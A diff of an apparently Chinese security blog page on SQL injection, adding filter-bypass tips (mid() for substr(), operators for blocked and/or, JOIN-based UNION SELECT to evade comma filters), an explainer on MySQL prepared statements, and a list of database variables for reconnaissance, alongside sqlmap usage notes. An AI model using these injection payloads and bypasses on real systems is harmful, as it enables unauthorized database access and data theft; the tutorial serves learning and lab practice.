@@ -697,14 +697,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        5.1k
+                        6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        19 分
+                        23 分
                     </div>
                     
                 
@@ -843,7 +843,12 @@
 <p> 8、查字段</p>
 <pre class="line-numbers language-mysql"><code class="language-mysql">?id=1' and length((select 列名 from 数据库.表名 limit 0,1))>0 --+
 然后重复以上猜解字符串手法<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p><strong>实际上，还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p>
+<p>如果有黑名单机制，可用<code>mid()</code>代替<code>substr()</code>，括号代替空格。</p>
+<p><strong>小trick</strong></p>
+<p>当and或者or等被禁时，可以用尝试用运算符代替。字符串和数字进行比较或者位运算时会被当作 <strong>0</strong>。</p>
+<p><img src="/img/image-20210401114906211.png" alt="image-20210401114906211"></p>
+<p>这张图简单验证了这一点。</p>
+<p><strong>实际上，一般还是直接使用sqlmap方便</strong>，直接在命令后面加 –technique B参数，则是指定进行布尔型注入（Boolen）。默认情况是BEUSTQ，即全部方式</p>
 <p> SQLMAP目前支持的注入方式包括（默认全进行）：</p>
 <blockquote>
 <p>  B: Boolean-based blind SQL injection（布尔型注入）</p>
@@ -963,7 +968,44 @@
 sqlmap &gt; py sqlmap.py -r post.txt --level=3 --batch     //指定探测级别，level 3级别就会自动探测http头</code></pre><p>要在http头中进行注入，只要在需要探测的字段后面添加一个<code>*</code>号，sqlmap就会自动对其进行探测了，如Referer注入就在Referer字段后面添加一个<code>*</code>号。</p>
 <pre><code>Referer: http://127.0.0.1/sqli/Less-19/*</code></pre><p><strong>4.使用Burpsuite带sqlmap插件注入</strong></p>
 <p>很简单，bp上配置好sqlmap插件后，右键，发送到sqlmap，然后流程和上面差不多，添加*号，或者指定参数。</p>
-<h2 id="GET报错注入"><a href="#GET报错注入" class="headerlink" title="GET报错注入"></a>GET报错注入</h2><script>
+<h2 id="GET报错注入"><a href="#GET报错注入" class="headerlink" title="GET报错注入"></a>GET报错注入</h2><h1 id="MySQL的SQL预处理-Prepared"><a href="#MySQL的SQL预处理-Prepared" class="headerlink" title="MySQL的SQL预处理(Prepared)"></a><a href="https://www.cnblogs.com/geaozhang/p/9891338.html" target="_blank" rel="noopener">MySQL的SQL预处理(Prepared)</a></h1><blockquote>
+<p>一、SQL 语句的执行处理<br>1、即时 SQL<br>　　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：<br>　　1. 词法和语义解析；<br>　　2. 优化 SQL 语句，制定执行计划；<br>　　3. 执行并返回结果；<br>　　如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。<br>2、预处理 SQL<br>　　但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符（即?）替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。</p>
+</blockquote>
+<p>MySQL 官方将 <code>prepare</code>、<code>execute</code>、<code>deallocate</code> 统称为 PREPARE STATEMENT。翻译也就习惯的称其为预处理语句。</p>
+<p>语法：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql"># 定义预处理语句
+PREPARE stmt_name FROM preparable_stmt;     # stmt_name是预处理语句的名字，preparable_stmt是sql语句
+# 执行预处理语句
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];    # mysql的变量前加@标识
+# 删除(释放)定义
+{DEALLOCATE | DROP} PREPARE stmt_name;    # deallocate或者drop都可以用来删除预处理语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>预处理 SQL 使用注意点</strong><br>1、stmt_name 作为 preparable_stmt 的接收者，<strong>唯一标识，不区分大小写</strong>。<br>2、preparable_stmt 语句中的 ? 是个占位符，所代表的是一个字符串，不需要将 ? 用引号包含起来。<br>3、定义一个已存在的 stmt_name ，原有的将被立即释放，类似于变量的重新赋值。<br>4、<strong>PREPARE stmt_name 的作用域是session级</strong><br>5、要用变量替换标识符时，字符串变量中的标识符部分要用反引号包起来，不然会当成字符常量。</p>
+<h1 id="SQL注入绕过技巧"><a href="#SQL注入绕过技巧" class="headerlink" title="SQL注入绕过技巧"></a>SQL注入绕过技巧</h1><h2 id="绕过逗号过滤"><a href="#绕过逗号过滤" class="headerlink" title="绕过逗号过滤"></a>绕过逗号过滤</h2><p><strong>join绕过</strong></p>
+<p>简单的几句，在显示位上替换为常见的注入变量或其它语句：</p>
+<pre class="line-numbers language-mysql"><code class="language-mysql">union select 1,2,3,4;
+
+union select * from ((select 1)A join (select 2)B join (select 3)C join (select 4)D);
+
+union select * from ((select 1)A join (select 2)B join (select 3)C join (select group_concat(user(),' ',database(),' ',@@datadir))D);//将4替换成你想要查询的数据
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><code>mid()</code>函数和<code>substr()</code>一样，一种写法是<code>mid(xxx,1,1)</code>，另一种是<code>mid(xxx,from 1 for 1)</code>但是如果过滤了for和逗号，那么怎么办呢？<br><code>ascii()</code>是取ascii码值的函数，如果传入一个字符串那么就会取第一个字符的字符的ascii码值，这就有了for的作用，并且mid()函数是可以只写from的表示从第几位往后的字符串，我们将取出的字符串在传入ascii()中取第一位，就完成了对单个字符的提取。</p>
+<p>这样在过滤了逗号时，就能够使用mid()代替substr()绕过了。</p>
+<h1 id="常用数据库变量："><a href="#常用数据库变量：" class="headerlink" title="常用数据库变量："></a>常用数据库变量：</h1><pre><code>User() 查看用户
+
+database()     --查看数据库名称
+
+Version()     --查看数据库版本
+
+@@datadir     --数据库路径
+
+@@version_compile_os    --操作系统版本
+
+system_user()     --系统用户名
+
+current_user()    --当前用户名
+
+session_user()    --连接数据库的用户名
+</code></pre><script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -1310,7 +1352,7 @@ MyS
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">93.1k</span> 字
+                <span class="white-color">95k</span> 字
             
 
             
